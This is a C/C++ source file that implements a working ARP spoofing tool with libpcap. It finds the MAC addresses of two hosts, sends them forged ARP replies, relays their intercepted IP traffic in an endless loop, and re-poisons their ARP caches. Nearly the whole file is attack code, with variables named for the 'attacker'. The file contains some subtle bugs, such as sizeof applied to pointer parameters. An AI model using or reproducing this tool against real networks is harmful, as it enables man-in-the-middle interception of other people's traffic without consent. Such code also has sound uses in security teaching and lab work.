#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <cstring>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>

unsigned char *mac;
unsigned char pk[50];
const u_char *rep;

#pragma pack(push,1)
struct Ether{
    uint8_t dst_MAC[6];
    uint8_t src_MAC[6];
    unsigned short ether_type;
};
struct ARP{
    unsigned short hw_type;
    unsigned short p_type;
    uint8_t hw_len;
    uint8_t p_len;
    unsigned short opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};
struct IP{
    uint8_t v_l;
    uint8_t tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t flag;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint8_t src_ip[4];
    uint8_t dst_ip[4];
    uint32_t options;
};
struct ARP_Packet{
    struct Ether eth;
    struct ARP arp;
};
struct Packet{
    struct Ether eth;
    struct IP ip;
};
struct Session{
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};
#pragma pack(pop)

void usage() {
    printf("syntax: send_arp <interface> <sender_ip> <target_ip> <sender_ip> <target_ip>\n");
    printf("sample: send_arp wlan0 1.1.1.1 2.2.2.2 2.2.2.2 1.1.1.1\n");
}
void print_MAC(uint8_t *addr){
    printf(": %02X:%02X:%02X:%02X:%02X:%02X\n",
           addr[0],addr[1],addr[2],addr[3],
            addr[4],addr[5]);
}
void print_IP(uint8_t *addr){
    printf(": %u.%u.%u.%u\n",
          addr[0],addr[1],addr[2],addr[3]);
}
void getAttackerMac(char *i){
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s < 0) perror("socket fail");
    struct ifreq ifr;
    strncpy(ifr.ifr_name, i, IFNAMSIZ);
    if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
        perror("ioctl fail");
    mac = reinterpret_cast<unsigned char *>(ifr.ifr_hwaddr.sa_data);

    close(s);
}
void make_arp_packet(uint8_t *targetM, uint8_t *srcM, int op, char *senderIP, char *targetIP, unsigned char *data){
    struct ARP_Packet packet;
    memcpy(packet.eth.dst_MAC,targetM,sizeof(packet.eth.dst_MAC));
    memcpy(packet.eth.src_MAC,srcM,sizeof(packet.eth.src_MAC));
    packet.eth.ether_type=htons(0x0806);
    packet.arp.hw_type=htons(0x0001);
    packet.arp.p_type=htons(0x0800);
    packet.arp.hw_len=0x06;
    packet.arp.p_len=0x04;
    packet.arp.opcode=htons(op);

    memcpy(packet.arp.sender_mac, srcM,sizeof(packet.arp.sender_mac));
    if(op==1)
        memcpy(packet.arp.target_mac, "\x00\x00\x00\x00\x00\x00", sizeof(packet.arp.target_mac));
    if(op==2)
        memcpy(packet.arp.target_mac, targetM, sizeof(packet.arp.target_mac));

    inet_pton(AF_INET, (char *)senderIP, &packet.arp.sender_ip);
    inet_pton(AF_INET, (char *)targetIP, &packet.arp.target_ip);

    memset(data,0,sizeof(data));
    memcpy(data,&packet,sizeof(packet));
}
bool check_arp_reply(pcap_t* handle, pcap_pkthdr* header, char *ip){
    struct ARP_Packet *arp_packet;
    while(1){ //check correct arp reply
        pcap_next_ex(handle, &header, &rep);
        arp_packet = (ARP_Packet *)rep;
        uint8_t check_ip[4];
        inet_pton(AF_INET, ip, check_ip);
        if((memcmp(arp_packet->arp.sender_ip, check_ip, sizeof(arp_packet->arp.sender_ip))==0)&&
                (ntohs(arp_packet->arp.opcode)==2)){
            return true;
        }
    }
}
void session_init(struct Session *sess,char *sender_ip, char *target_ip, uint8_t *s_mac, uint8_t *t_mac){
    uint8_t t_ip[4];
    uint8_t s_ip[4];
    inet_pton(AF_INET, sender_ip, s_ip);
    inet_pton(AF_INET, target_ip, t_ip);
    memcpy(sess->sender_ip,s_ip,sizeof(s_ip));
    memcpy(sess->target_ip,t_ip,sizeof(t_ip));
    memcpy(sess->sender_mac,s_mac,sizeof(s_mac));
    memcpy(sess->target_mac,t_mac,sizeof(t_mac));
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        usage();
        return -1;
    }
    //get my ip
    struct ifreq ifr;
    char ipstr[40];
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
    }
    uint8_t attacker_ip[4];
    inet_pton(AF_INET, ipstr, attacker_ip);

    char* dev = argv[1]; //network interface name
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    uint8_t attacker[6];
    getAttackerMac(argv[1]);
    memcpy(attacker,mac,sizeof(attacker));
    printf("attacker's MAC -> ");
    print_MAC(attacker);

    unsigned char data[50];
    uint8_t broadcast[6];
    memcpy(broadcast,"\xFF\xFF\xFF\xFF\xFF\xFF",6);
    make_arp_packet(broadcast ,attacker, 0x0001, ipstr, argv[2],data);

    //send arp req to find sender mac
    if(pcap_sendpacket(handle, data ,sizeof(data))!=0){
        printf("error\n");
        exit(0);
    }
    printf("[+]Success: send arp request to find the sender's MAC\n");

    struct pcap_pkthdr* header;
    struct ARP_Packet *arp_packet;
    uint8_t sender_mac[6];
    //check correct arp reply
    if(check_arp_reply(handle,header,argv[2])){
        arp_packet = (ARP_Packet *)rep;
        memcpy(sender_mac,arp_packet->arp.sender_mac,sizeof(sender_mac));
    }printf("[+]Success: check the sender's MAC\n");
    
    memset(data,0,sizeof(data));
    make_arp_packet(broadcast ,attacker, 0x0001, ipstr, argv[3],data);

    //send arp req to find target mac
    if(pcap_sendpacket(handle, data ,sizeof(data))!=0)
        printf("error\n");
    printf("[+]Success: send arp request to find the target's MAC\n");

    uint8_t target_mac[6];
    if(check_arp_reply(handle,header,argv[3])){    
        arp_packet = (ARP_Packet *)rep;
        memcpy(target_mac,arp_packet->arp.sender_mac,sizeof(target_mac));
    }printf("[+]Success: check the target's MAC\n");

    struct Session sess[2];
    session_init(&sess[0],argv[2],argv[3],sender_mac,target_mac);
    session_init(&sess[1],argv[4],argv[5],target_mac,sender_mac);

    //make arp spoofing packet
    unsigned char sess1_pk[50], sess2_pk[50];
    memset(sess1_pk,0,sizeof(sess1_pk));
    memset(sess2_pk,0,sizeof(sess2_pk));
    make_arp_packet(sess[0].sender_mac,attacker,0x0002,argv[3],argv[2],sess1_pk);
    make_arp_packet(sess[1].sender_mac,attacker,0x0002,argv[5],argv[4],sess2_pk);

    const u_char *packet;
    if(pcap_sendpacket(handle, sess1_pk ,sizeof(sess1_pk))!=0){
        printf("[-]Failed to send 1st session spoofed packet\n");
        exit(0);
    }printf("[+]Success: send 1st session spoofed packet\n");
    if(pcap_sendpacket(handle, sess2_pk ,sizeof(sess2_pk))!=0){
        printf("[-]Failed to send 2nd session spoofed packet\n");
        exit(0);
    }printf("[+]Success: send 2nd session spoofed packet\n");

    while(1){
        //attack     
        pcap_next_ex(handle, &header, &packet);
        
        Packet *p = (Packet *)packet;

        //relay check
        printf("ether type : %04X\n",ntohs(p->eth.ether_type));
        if(ntohs(p->eth.ether_type)==0x0800){
            if((memcmp(p->eth.src_MAC,sess[0].sender_mac,sizeof(p->eth.src_MAC))==0)&&
            (memcmp(p->ip.dst_ip,attacker_ip,sizeof(attacker_ip))!=0)){
                memcpy(p->eth.src_MAC,attacker,sizeof(p->eth.dst_MAC));
                memcpy(p->eth.dst_MAC,sess[0].target_mac,sizeof(sess[0].target_mac));
            }
            if((memcmp(p->eth.src_MAC,sess[1].sender_mac,sizeof(p->eth.src_MAC))==0)&&
            (memcmp(p->ip.dst_ip,attacker_ip,sizeof(attacker_ip))!=0)){
                memcpy(p->eth.src_MAC,attacker,sizeof(p->eth.dst_MAC));
                memcpy(p->eth.dst_MAC,sess[1].target_mac,sizeof(sess[1].target_mac));
            }
            if(pcap_sendpacket(handle, packet ,header->len)!=0) {
                printf("Error!!!!!!!!!!!!!!!!\n");
                printf("\n%u\n", header->len);
                exit(1);
            }
            else printf("[+]relay session\n");
        }
        else if(ntohs(p->eth.ether_type)==0x0806){
            if(pcap_sendpacket(handle, sess1_pk ,sizeof(sess1_pk))!=0){
                printf("[*]Failed to 2nd session spoofed packet\n");
                exit(0);
            }printf("[*]Success: send 1st session spoofed packet\n");
            if(pcap_sendpacket(handle, sess2_pk ,sizeof(sess2_pk))!=0){
                printf("[*]Failed to send 2nd session spoofed packet\n");
                exit(0);
            }printf("[*]Success: send 2nd session spoofed packet\n");
        }else
            printf("\n[-]filtering\n");
    }
    pcap_close(handle);
    return 0;

}